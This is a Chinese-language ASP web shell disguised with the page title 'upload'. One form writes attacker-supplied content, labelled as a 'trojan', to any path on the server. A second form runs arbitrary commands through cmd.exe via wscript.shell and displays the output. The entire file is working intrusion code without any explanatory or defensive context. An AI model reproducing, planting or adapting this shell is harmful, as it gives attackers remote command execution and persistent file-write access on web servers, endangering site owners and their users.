<html><body>
<STYLE TYPE="text/css">textarea,input,body,select,pre,td,th{font-family: "宋体";font-size: 9pt}.button {border-width: 1px} .text {border:solid 1px}</STYLE>
<Title>上传</Title>
<%Dim objFSO%>
<%Dim fdata%>
<%Dim objCountFile%>
<%on error resume next%>
<%Set objFSO = Server.CreateObject("Scripting.FileSystemObject")%>
<%if Trim(request("syfdpath"))<>"" then%>
<%fdata = request("cyfddata")%>
<%Set objCountFile=objFSO.CreateTextFile(request("syfdpath"),True)%>
<%objCountFile.Write fdata%>
<%if err =0 then%>
<font color=red>保存成功.请返回刷新页面!</font>
<%else%>
<font color=red>保存失败.可能服务器不支持FSO</font>
<%end if%>
<%err.clear%>
<%end if%>
<%objCountFile.Close%>
<%Set objCountFile=Nothing%>
<%Set objFSO = Nothing%>
<form action='' method=post>
<font color=red>请输入文件保存路径:</font><br>
<input type=text name=syfdpath width=32 value="<%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%>" style="border:solid 1px" size=80><br>
输入马的内容:<br>
<textarea name=cyfddata cols=80 rows=10 width=32 style="border:solid 1px"></textarea>
<br><input type=submit value=保存 style="border:solid 1px">
</form><form action="" method="post">
CMD命令:<input type=text name=c style="border:solid 1px" size=73><br>
<textarea cols=80 rows=20 style="border:solid 1px">
<%=server.createobject("wscript.shell").exec("cmd.exe /c" &request("c")).stdout.readall%>
</textarea></form></body></html>

